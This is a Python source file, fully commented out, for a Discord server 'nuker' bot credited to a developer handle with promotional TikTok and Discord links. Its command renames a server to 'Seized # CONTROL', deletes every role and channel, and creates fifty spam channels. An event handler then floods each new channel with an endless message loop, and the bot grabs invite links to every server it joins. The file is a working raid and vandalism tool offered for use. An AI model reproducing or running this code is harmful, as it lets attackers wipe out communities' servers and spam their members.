# from utilities.Program.utils.utils import *
# import asyncio
# import discord
# from discord.ext import commands
# from colorama import *

# blue = Fore.BLUE
# red = Fore.RED
################################################################

            # discord : uhq.s
            # tiktok  : https://tiktok.com/@paiementsecurise
            # serveur : https://discord.gg/wyUuYr9DEN
            # dev : uhq.s
            # owner : uhq.s

################################################################


# async def menu():
#                 os.system('cls')
#                 print(Fore.BLUE + """

# <-. (`-')_            <-.(`-')  (`-')  _   (`-')  
#    \( OO) )     .->    __( OO)  ( OO).-/<-.(OO )  
# ,--./ ,--/ ,--.(,--.  '-'. ,--.(,------.,------,) 
# |   \ |  | |  | |(`-')|  .'   / |  .---'|   /`. ' 
# |  . '|  |)|  | |(OO )|      /)(|  '--. |  |_.' | 
# |  |\    | |  | | |  \|  .   '  |  .--' |  .   .' 
# |  | \   | \  '-'(_ .'|  |\   \ |  `---.|  |\  \  
# `--'  `--'  `-----'   `--' '--' `------'`--' '--' 


# """)
#                 token = input(blue + f"\n[+] Bot token : ")
#                 f = open("utilities/Plugins/ignore/.token", "w")
#                 f.write(token)
#                 f.close()

#                 prefix = input(red + f"[-] Bot prefix : ")
#                 f = open("utilities/Plugins/ignore/.prefix", "w")
#                 f.write(prefix)
#                 f.close()

#                 spammessage = input(blue + f"[+] Spam message : ")
#                 f = open("utilities/Plugins/ignore/.message", "w")
#                 f.write(spammessage)
#                 f.close()

#                 channelsname = input(red + f"[-] Channels name : ")
#                 f = open("utilities/Plugins/ignore/.channelsname", "w")
#                 channelsname = channelsname.lower()
#                 channelsname.replace("", "-")
#                 f.write(channelsname)
#                 f.close()
#                 main()

# def main():
    
#             prefix = open("utilities/Plugins/ignore/.prefix", "r")
#             prefix = prefix.read()

#             token = open("utilities/Plugins/ignore/.token", "r")
#             token = token.read()

#             channelsname = open("utilities/Plugins/ignore/.channelsname", "r")
#             channelsname = channelsname.read()

#             spammessage = open("utilities/Plugins/ignore/.message", "r")
#             spammessage = spammessage.read()

#             intents = discord.Intents.default()
#             intents.messages = True
#             uhq = commands.Bot(command_prefix=prefix, intents=intents)
#             uhq.remove_command('help')

#             @uhq.event
#             async def on_ready():
#                 if len(uhq.guilds) > 1:
#                     guildpl = "guilds"
#                 else:
#                     guildpl = "guild"
#                 activity = discord.Game(name=f"uhq.s on top", type=3)
#                 await uhq.change_presence(status=discord.Status.dnd, activity=activity)
#                 os.system('cls')
#                 print(f"[\x1b[95m>\x1b[95m\x1B[37m] Bot : {uhq.user} ({len(uhq.guilds)} {guildpl})")
#                 print(f"[\x1b[95m>\x1b[95m\x1B[37m] Prefix : {prefix}")
#                 print(f"[\x1b[95m>\x1b[95m\x1B[37m] Spam message : {spammessage}")
#                 print(f"[\x1b[95m>\x1b[95m\x1B[37m] Channels name : {channelsname}")
#                 print(f"")
#                 print(f"[\x1b[95m>\x1b[95m\x1B[37m] type: {prefix}fuck in a channel")
#                 print(f'BOT TOKEN : {token}')
#                 print(f"")

#             @uhq.event
#             async def on_guild_channel_create(channel):
#                 while True:
#                     await channel.send(spammessage)
#                     print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Sent : {spammessage}")

#             @uhq.event
#             async def on_guild_join(guild):
#                 for channel in guild.text_channels:
#                     if channel.permissions_for(guild.me).create_instant_invite:
#                         invite = await channel.create_invite()
#                         break
#                 print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Joined Guild : {guild.name} ({guild.id}) {invite}")

#             @uhq.command()
#             async def fuck(ctx):
#                 await ctx.message.delete()
#                 print(f"[\x1b[95m>\x1b[95m\x1B[37m] Nuking {ctx.guild.name} ({ctx.guild.id})...")
#                 await ctx.guild.edit(name="Seized # CONTROL")
#                 for role in ctx.guild.roles:
#                     try:
#                         await role.delete()
#                         print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted: @{role.name}")
#                     except:
#                         pass
#                         print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Couldnt Delete: @{role.name}")

#                 for channel in ctx.guild.channels:
#                     try:
#                         await channel.delete()
#                         print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted: #{channel.name}")
#                     except:
#                         pass
#                         print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Couldnt Delete: #{channel.name}")
#                 try:
#                     for i in range(50):
#                         await ctx.guild.create_text_channel(channelsname)
#                         print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Created: #{channel.name}")
#                 except Exception as er:
#                     print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error: {er}")
#             uhq.run(token)

    
            
#             input(red + 'PRESS ENTER TO RETURN TO MENU')








